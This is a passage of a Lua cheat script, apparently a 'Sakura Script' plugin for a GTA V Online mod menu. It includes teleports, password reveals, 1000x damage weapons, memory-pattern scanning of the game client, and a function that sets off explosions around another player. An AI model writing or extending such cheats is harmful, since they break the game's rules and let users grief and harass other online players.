            interior = INTERIOR.GET_INTERIOR_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
            util.yield_once()
        end
        for i, veh1 in pairs(entities.get_all_vehicles_as_handles()) do
            local model = util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(veh1))
            if model:find(spawned_model) then
                local veh_pos = ENTITY.GET_ENTITY_COORDS(veh1, true)
                if Get_distance(pos, veh_pos, true) < 5.0 then
                    delete_entity(veh1)
                    break
                end
            end
        end
    else
        util.toast("你还没进载具呢")
    end
end

----通知藏匿屋密码
function notify_password()
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        if ENTITY.IS_ENTITY_A_MISSION_ENTITY(obj) then
            local hash = ENTITY.GET_ENTITY_MODEL(obj)
            if hidden_house_password[hash] ~= nil then
                util.toast("藏匿屋密码" .. hidden_house_password[hash])
                return
            end
        end
    end
    util.toast("未找到密码")
end
----获取杰拉德包裹位置
function get_package()
    local package = {765087784, -1620734287, 138777325,}
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        if table_find(package, ENTITY.GET_ENTITY_MODEL(obj)) then
            util.toast("找到包裹")
            local pos1 = ENTITY.GET_ENTITY_COORDS(obj, false)
            teleport(pos1.x, pos1.y, pos1.z, false)
            return
        end
    end
    util.toast("未找到包裹")
end

----显示余额
function show_credit(toggled)
    if toggled then
        HUD.SET_MULTIPLAYER_WALLET_CASH()
        HUD.SET_MULTIPLAYER_BANK_CASH()
    else
        HUD.REMOVE_MULTIPLAYER_WALLET_CASH()
        HUD.REMOVE_MULTIPLAYER_BANK_CASH()
    end
end

-----UFO勇闯洛城
function UFO_Los_Angeles()
    local ufo = util.joaat("sum_prop_dufocore_01a")
    local c = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local r = math.random(1, 35)
    c.x = math.random(0.0,1.0) >= 0.5 and c.x + r + 5 or c.x - r - 5 --set x coords
    c.y = math.random(0.0,1.0) >= 0.5 and c.y + r + 5 or c.y - r - 5 --set y coords
    c.z = c.z + r + 8 --set z coords
    request_model(ufo)
    util.yield(2500)
    local spawnedufo = entities.create_object(ufo, c) --spawn ufo
    util.yield(500)
    local ufoc = ENTITY.GET_ENTITY_COORDS(spawnedufo) --get ufo pos
    ufoc = waypoint_coord(ufoc.x, ufoc.y, ufoc.z)
    FIRE.ADD_EXPLOSION(ufoc.x, ufoc.y, ufoc.z + 10, 1, 100.0, true, false, 1.0, false) --explode at floor
    util.yield(1500)
    delete_entity(spawnedufo) --delete ufo
end

------音乐
function music(on)
	if on then
        AUDIO.SET_MOBILE_RADIO_ENABLED_DURING_GAMEPLAY(true)--强制打开电台
        AUDIO.SET_RADIO_TO_STATION_NAME("RADIO_19_USER")--设置电台频道
        --AUDIO.LOCK_RADIO_STATION("RADIO_19_USER",false)--禁用电台
        --AUDIO.FREEZE_RADIO_STATION(AUDIO.GET_PLAYER_RADIO_STATION_INDEX())
    else
        AUDIO.SET_MOBILE_RADIO_ENABLED_DURING_GAMEPLAY(false)
        AUDIO.SET_RADIO_TO_STATION_NAME("OFF")
    end
end

----爆炸圈
local explosion_circle_angle = 0
function explosion_circle(ped, angle, radius)
    local ped_coords = ENTITY.GET_ENTITY_COORDS(ped)
    local offset_x = ped_coords.x
    local offset_y = ped_coords.y
    local x = offset_x + radius * math.cos(angle)
    local y = offset_y + radius * math.sin(angle)
    FIRE.ADD_EXPLOSION(x, y, ped_coords.z, 4, 1, true, false, 0)
end
function explosion_range(pid)
    local ped = PLAYER.GET_PLAYER_PED(pid)
    explosion_circle(ped, explosion_circle_angle, 25)
    explosion_circle_angle = explosion_circle_angle + 0.15
    util.yield(50)
end

--角度转换为弧度
function degToRad(degrees)
    return degrees * (math.pi / 180)
end
----超级飞侠
function Super_Wings(toggled)
    local run_cap = 100.0
    local run_speed = 10.0
    local ptfxs = {}
    super_wings_toggled = toggled
    while super_wings_toggled do
        if PAD.IS_CONTROL_PRESSED(0, 21) and PAD.IS_CONTROL_PRESSED(0, 32) then
            if not GRAPHICS.DOES_PARTICLE_FX_LOOPED_EXIST(ptfxs[3]) then
                request_ptfx_asset("core")
                ptfxs[1] = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("veh_exhaust_spacecraft", PLAYER.PLAYER_PED_ID(), 0, 3, 0, 0, 0, 0, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x322c), 2, false, false, false, 255, 255, 255, 255)
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                ptfxs[2] = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_foundry_molten_pour", PLAYER.PLAYER_PED_ID(), 0, 3, 0, 0, 0, 0, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x49D9), 2, false, false, false, 255, 255, 255, 255)
                GRAPHICS.USE_PARTICLE_FX_ASSET("core")
                ptfxs[3] = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_foundry_molten_pour", PLAYER.PLAYER_PED_ID(), 0, 3, 0, 0, 0, 0, PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0xDEAD), 2, false, false, false, 255, 255, 255, 255)
            end

            ENTITY.SET_ENTITY_ALPHA(PLAYER.PLAYER_PED_ID(), 0, false)

            if run_speed < run_cap then
                run_speed = run_speed + 0.5
            end

            local location = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
            local ped = PLAYER.PLAYER_PED_ID()
            local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
            local yaw = degToRad(rot.z + 90)

            local offset = {
                x = location.x + (run_speed * math.cos(yaw)),
                y = location.y + (run_speed * math.sin(yaw)),
                z = location.z + 0.2
            }

            local groundZ = 0.0
            MISC.GET_GROUND_Z_FOR_3D_COORD(offset.x, offset.y, 1000.0, groundZ, false)
            if groundZ < location.z then
                offset.z = groundZ
            end

            local vel = {
                x = offset.x - location.x,
                y = offset.y - location.y,
                z = offset.z - location.z
            }

            ENTITY.SET_ENTITY_VELOCITY(ped, vel.x, vel.y, vel.z)
        else
            if ENTITY.GET_ENTITY_SPEED(PLAYER.PLAYER_PED_ID()) > 5 then
                ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), 0, 0, 0)
            end
            remove_particle_fx(ptfxs)
            ENTITY.RESET_ENTITY_ALPHA(PLAYER.PLAYER_PED_ID())
            ptfxs = {}
        end
        util.yield()
    end
    ENTITY.RESET_ENTITY_ALPHA(PLAYER.PLAYER_PED_ID())
    remove_particle_fx(ptfxs)
end



-----主机序列

--fps帧数
local fps = 0
local fpstoggle = false
function get_fps(toggled)
    if toggled then
        if menu.get_value(host_sequence) == true then
            fpstoggle = true
            util.create_thread(function()
                while fpstoggle do
                    fps = math.ceil(1/SYSTEM.TIMESTEP())
                    util.yield(500)
                end
            end)
        else
            util.toast("请先开启主机序列")
            menu.set_value(numfps, false)
        end
    else
        fpstoggle = false
    end
end

local replayInterface = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
local pedInterface = memory.read_long(replayInterface + 0x0018)
local vehInterface = memory.read_long(replayInterface + 0x0010)
local objectInterface = memory.read_long(replayInterface + 0x0028)
local pickupInterface = memory.read_long(replayInterface + 0x0020)

local zhujixvlie_posx = (luaConfig.host_sequence_x or 175) / 1000
local zhujixvlie_posy = (luaConfig.host_sequence_y or 720) / 1000 
function zhujixvlie_x(x_)
    zhujixvlie_posx = x_ / 1000
end
function zhujixvlie_y(y_)
    zhujixvlie_posy = y_ / 1000
end
function zhujixvlie()
    --下位主机
    local nexthost_name = "不可用"
    for pid = 0, 31 do
        local host_queue = players.get_host_queue_position(pid)
        if #players.list() > 1 and host_queue == 1 and players.get_name(pid) ~= "UndiscoveredPlayer" then
            nexthost_name = PLAYER.GET_PLAYER_NAME(pid)
        end
    end

    --杂项
    local inviciamountint = 0
    for pid = 0, 31 do
        --作弊者人数
        if players.exists(pid) and pid ~= PLAYER.PLAYER_ID() then
            if players.is_marked_as_modder(pid) then
                inviciamountint = inviciamountint + 1
            end
        end
    end

    --时速
    local speed = math.ceil(ENTITY.GET_ENTITY_SPEED(PLAYER.PLAYER_PED_ID()) * 3.6)
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        local veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
        speed = math.ceil(ENTITY.GET_ENTITY_SPEED(veh) * 3.6)
    end
    

--~italic~ 斜体
--~bold~ 加粗
--~?~ color
    if fpstoggle then
        draw_string(string.format("~bold~~o~FPS: ~b~"..fps), zhujixvlie_posx, zhujixvlie_posy - 0.002, 0.3,1)
    end

	draw_string(string.format("~bold~~b~"..speed.." ~g~km/h"), zhujixvlie_posx,zhujixvlie_posy + 0.026, 0.3,1)-----速度
	draw_string(string.format("~bold~~y~"..os.date("%X")), zhujixvlie_posx, zhujixvlie_posy + 0.054, 0.3,1)    -----------------时间
	draw_string(string.format("~bold~战局人数: ~g~"..#players.list()), zhujixvlie_posx, zhujixvlie_posy + 0.082, 0.3,1) 
	draw_string(string.format("~bold~作弊人数: ~r~"..inviciamountint), zhujixvlie_posx, zhujixvlie_posy + 0.11, 0.3,1)

    if PLAYER.GET_PLAYER_NAME(players.get_host()) == "**Invalid**" then
        draw_string(string.format("~bold~战局主机: ~y~不可用", ALIGN_TOP_LEFT), zhujixvlie_posx, zhujixvlie_posy + 0.138, 0.3,1)
    else
        draw_string(string.format("~bold~战局主机: ~y~"..players.get_name(players.get_host())), zhujixvlie_posx, zhujixvlie_posy + 0.138, 0.3,1)
    end

    if PLAYER.GET_PLAYER_NAME(players.get_script_host()) == "**Invalid**" then
        draw_string(string.format("~bold~脚本主机: ~b~不可用", ALIGN_TOP_LEFT), zhujixvlie_posx, zhujixvlie_posy + 0.166, 0.3,1) 
    else
        draw_string(string.format("~bold~脚本主机: ~b~"..players.get_name(players.get_script_host())), zhujixvlie_posx, zhujixvlie_posy + 0.166, 0.3,1)
    end

    draw_string(string.format("~bold~~g~下一位主机: ~p~"..nexthost_name), zhujixvlie_posx, zhujixvlie_posy + 0.194, 0.3,1) 

    local hostxvlie = players.get_host_queue_position(PLAYER.PLAYER_ID())
    if hostxvlie == 0 then
        draw_string(string.format("~bold~~q~你现在是战局主机"), zhujixvlie_posx, zhujixvlie_posy + 0.222, 0.3,1) 
    else
        draw_string(string.format("~bold~~q~你的主机优先度:~q~ "..hostxvlie), zhujixvlie_posx, zhujixvlie_posy + 0.222, 0.3,1) 
    end

    if is_UltimateUser(PLAYER.PLAYER_ID()) then
        draw_string(string.format("~bold~~o~Sakura ".. SCRIPT_VERSION .." (Ultimate)"), zhujixvlie_posx, zhujixvlie_posy + 0.25, 0.3,1)
    else
        draw_string(string.format("~bold~~m~Sakura ".. SCRIPT_VERSION .." (Free)"), zhujixvlie_posx, zhujixvlie_posy + 0.25, 0.3,1) 
    end

end




----实体池信息
function entityinfo()
    draw_string(string.format("~h~~f~实体池Info~"), 0,0, 0.32,1)
    draw_string(string.format("~h~ped: ~g~"..memory.read_int(pedInterface + 0x0110).."/"..memory.read_int(pedInterface + 0x0108)), 0,0.03, 0.3,1)
    draw_string(string.format("~h~veh: ~y~"..memory.read_int(vehInterface + 0x0190).."/"..memory.read_int(vehInterface + 0x0188)), 0,0.06, 0.3,1)
    draw_string(string.format("~h~obj: ~r~"..memory.read_int(objectInterface + 0x0168).."/"..memory.read_int(objectInterface + 0x0160)), 0,0.09, 0.3,1)
    draw_string(string.format("~h~拾取物: ~q~ "..memory.read_int(pickupInterface + 0x0110).."/"..memory.read_int(pickupInterface + 0x0108)), 0,0.12, 0.3,1)
end

-----显示时间
function real_time(state)
    local strings = os.date('~bold~ ~o~ %Y-%m-%d ~b~%H:%M:%S', os.time())
    draw_string(strings, 0.45, 0.05, 0.5, 4)
end

----脚本昵称
function scriptname()
    local timer = MISC.GET_GAME_TIMER()
    local color =  gradient_colour(timer, 0.5)       
    HUD.SET_TEXT_COLOUR(color.r, color.g, color.b, 255)
    if is_UltimateUser(PLAYER.PLAYER_ID()) then
        draw_string(string.format("~italic~ ~bold~ -∑ Sakura Ultimate -∑"), 0.405, 0.1, 0.5, 5) --¦-∑
    else
        draw_string(string.format("~italic~ ~bold~ -∑ Sakura Script v"..SCRIPT_VERSION), 0.405, 0.1, 0.5, 5) --¦-∑
    end
end


----显示logo
function show_logo(toggled)
    logo_toggled = toggled
    local logo = directx.create_texture(filesystem.resources_dir() .. '/SakuraScript/Img/banner.png')
    while logo_toggled do
        directx.draw_texture(logo, 0.06, 0.1, 0.0, 0.0, 0.86, 0.57, 0, 1, 1, 1, 1)
        util.yield()
    end
end
----Tom&Jerry
function show_Tom(toggled)
    Tom_toggled = toggled
    local logo = directx.create_texture(filesystem.resources_dir() .. '/SakuraScript/Img/1.png')
    while Tom_toggled do
        directx.draw_texture(logo, 0.1, 0.1, 1.3, -1.1, 0.5, 0.5, 0, 1, 1, 1, 1)
        util.yield()
    end
end






----特殊武器
--大锤
function hammer(on)
    if on then
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false)--禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1810795771,15,true,true)--给予指定武器
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), false, false, false, false)--武器隐形

        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        handlebar = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_02a"), pos.x, pos.y, pos.z, true, true, false)--大锤手柄
        dachui = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_02a"), pos.x, pos.y, pos.z, true, true, false)--大锤
        menu.trigger_commands("damagemultiplier 1000")
        menu.trigger_commands("rangemultiplier 1.5")
        ENTITY.ATTACH_ENTITY_TO_ENTITY(handlebar, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dachui,handlebar, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true, 0)
    else
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),true)
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        delete_entity(handlebar)
        delete_entity(dachui)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1569615261,15,true,true)--给予徒手
    end
end

--雷神锤
function thunder_hammer(on)
    if on then
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false)--禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1810795771,15,true,true)--给予指定武器
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), false, false, false, false)--武器隐形

        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        thunderlebar = OBJECT.CREATE_OBJECT(-1924271972, pos.x, pos.y, pos.z, true, true, false)--大锤手柄
        menu.trigger_commands("damagemultiplier 1000")
        menu.trigger_commands("rangemultiplier 1.5")
        ENTITY.ATTACH_ENTITY_TO_ENTITY(thunderlebar, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.08, 0.22, 0.05, -75, 45.0, 0, true, true, false, false, 0, true, 0)
    else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        delete_entity(thunderlebar)

        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),true)--解除禁止切换武器
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), true, false, false, false)--解除武器隐形
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1569615261,15,true,true)--给予徒手
    end
end
--流星锤
function meteorhammer(on)
    if on then
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false)--禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1810795771,15,true,true)--给予指定武器

        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        meteorhandlebar = OBJECT.CREATE_OBJECT(util.joaat("prop_glass_stack_03"), pos.x, pos.y, pos.z, true, true, false)--prop_gate_farm_post
        meteordachui = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_pile_03"), pos.x, pos.y, pos.z, true, true, false)--h4_prop_h4_barrel_01a
        menu.trigger_commands("damagemultiplier 1000")
        menu.trigger_commands("rangemultiplier 1.5")
        ENTITY.ATTACH_ENTITY_TO_ENTITY(meteorhandlebar, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 115, 30.0, 0, true, true, false, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(meteordachui,meteorhandlebar, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true, 0)
    else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        delete_entity(meteorhandlebar)
        delete_entity(meteordachui)

        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),true)--解除禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1569615261,15,true,true)--给予徒手
    end
end
--原子锤
function atomhammer(on)
    if on then
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false)--禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1810795771,15,true,true)--给予指定武器
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), false, false, false, false)--武器隐形

        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        atomhandlebar = OBJECT.CREATE_OBJECT(util.joaat("prop_bollard_04"), pos.x, pos.y, pos.z, true, true, false)
        atomdachui = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_03d"), pos.x, pos.y, pos.z, true, true, false)
        atomdachui1 = OBJECT.CREATE_OBJECT(util.joaat("prop_barrel_03d"), pos.x, pos.y, pos.z, true, true, false)
        menu.trigger_commands("damagemultiplier 1000")
        menu.trigger_commands("rangemultiplier 1.5")
        ENTITY.ATTACH_ENTITY_TO_ENTITY(atomhandlebar, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(atomdachui,atomhandlebar, 0,  0, 0, -0.2, -35.0, 100.0,0, true, true, false, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(atomdachui1,atomhandlebar, 0,  0, 0, -0.201, 145, 100.0,0, true, true, false, false, 0, true, 0)
    else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        delete_entity(atomhandlebar)
        delete_entity(atomdachui)
        delete_entity(atomdachui1)

        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),true)--解除禁止切换武器
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), true, false, false, false)--解除武器隐形
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1569615261,15,true,true)--给予徒手
    end
end
--小熊大锤
function bearhammer(on)
    if on then
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false)--禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1810795771,15,true,true)--给予指定武器

        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        bearhandlebar = OBJECT.CREATE_OBJECT(util.joaat("ba_prop_battle_cameradrone"), pos.x, pos.y, pos.z, true, true, false)
        beardachui = OBJECT.CREATE_OBJECT(util.joaat("prop_mr_raspberry_01"), pos.x, pos.y, pos.z, true, true, false)
        menu.trigger_commands("damagemultiplier 1000")
        menu.trigger_commands("rangemultiplier 1.5")
        ENTITY.ATTACH_ENTITY_TO_ENTITY(bearhandlebar, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.2, 0.95, 0.2, 105, 30.0, 0, true, true, false, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(beardachui,bearhandlebar, 0,  0, 0, 0.15, 0, 180,180, true, true, false, false, 0, true, 0)
    else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        delete_entity(bearhandlebar)
        delete_entity(beardachui)

        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),true)--解除禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1569615261,15,true,true)--给予徒手
    end
end
--粉色独角兽
function unicorn(on)
    if on then
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false)--禁止切换武器
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1810795771,15,true,true)--给予指定武器
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), false, false, false, false)--武器隐形

        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(),true)
        unicornhandlebar = OBJECT.CREATE_OBJECT(util.joaat("ba_prop_battle_cameradrone"), pos.x, pos.y, pos.z, true, true, false)
        ENTITY.SET_ENTITY_VISIBLE(unicornhandlebar, false, 0)
        unicorndachui = OBJECT.CREATE_OBJECT(util.joaat("ba_prop_battle_hobby_horse"), pos.x, pos.y, pos.z, true, true, false)
        menu.trigger_commands("damagemultiplier 1000")
        menu.trigger_commands("rangemultiplier 1.5")
        ENTITY.ATTACH_ENTITY_TO_ENTITY(unicornhandlebar, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.165, 0.9, 0.205, 105, 30, 1, true, true, false, false, 0, true, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(unicorndachui,unicornhandlebar, 0, 0, 0, 0.74, -1.9, 184, 233, true, true, false, false, 0, true, 0)
    else
        menu.trigger_commands("damagemultiplier 1")
        menu.trigger_commands("rangemultiplier 1")
        delete_entity(unicornhandlebar)
        delete_entity(unicorndachui)

        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),true)--解除禁止切换武器
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), true, false, false, false)--解除武器隐形
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1569615261,15,true,true)--给予徒手
    end
end
--太刀
function knife(on)
    if on then
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false)--禁止切换武器
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        saber = OBJECT.CREATE_OBJECT(util.joaat("prop_cs_katana_01"), pos.x, pos.y, pos.z, true, true, false)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),1317494643,15,true,true)
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(saber, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.07, 0, 0, -100, 0.0, 0, true, true, true, true, 0, true, 0)
    else
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),true)
        delete_entity(saber)
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1569615261,15,true,true)--给予徒手
    end
end

---小挂件

function dd_showpng()
    local Img = directx.create_texture(filesystem.resources_dir() .. "SakuraScript\\Img\\1.png")
    directx.draw_texture(Img, 0.1, 0.1, 1.3, -1.1, 0.5, 0.5, 0, 1, 1, 1, 1)
end

-------喷火器
flamemildOrangeFire = new_colour( 255, 127, 80 )
flameThrower = {
    colour = flamemildOrangeFire
}
function flamegun()
    if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) ~= 1119849093 or not PAD.IS_CONTROL_PRESSED(2, 25) then
        if not flameThrower.ptfx then return end
        GRAPHICS.REMOVE_PARTICLE_FX(flameThrower.ptfx, false)
        STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        flameThrower.ptfx = nil
        return
    end
    PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
        util.yield()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
    if flameThrower.ptfx == nil then
        flameThrower.ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
                'muz_xs_turret_flamethrower_looping',
                WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), 0),
                0.8, 0, 0, 0, 0, 270,
                ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID(), 0), 'Gun_Nuzzle'),
                0.5, false, false, false, 0, 0, 0, 0
            )
        GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(flameThrower.ptfx, flameThrower.colour.r, flameThrower.colour.g, flameThrower.colour.b, false)
    end
end



--双拳
local bones = {
    26612,
    58868,
}
function Fire_Fist(on)
    if on then
        for _, boneId in ipairs(bones) do
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("fire_wrecked_plane_cockpit", PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
        end
    else
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
    end
end
function Blood_Fist(on)
    if on then
        for _, boneId in ipairs(bones) do
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scrape_blood_car", PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), boneId), 0.35, false, false, false, 0, 0, 0, 0)
        end
    else
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
    end
end
function Raiden_Fist(on)
    if on then
        for _, boneId in ipairs(bones) do
        request_ptfx_asset("scr_reconstructionaccident")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_reconstructionaccident")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0 , 0,PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), boneId), 2, false, false, false, 0, 0, 0, 0)
        end
    else
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
    end
end



-----自动节流器
ped_limit = 100
veh_limit = 180
obj_limit = 500
function entity_limit()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= PLAYER.PLAYER_PED_ID() then
            ped_count = ped_count + 1
        end
    end
    if ped_count >= ped_limit then
        util.toast("Ped池达到上限,正在清理...")
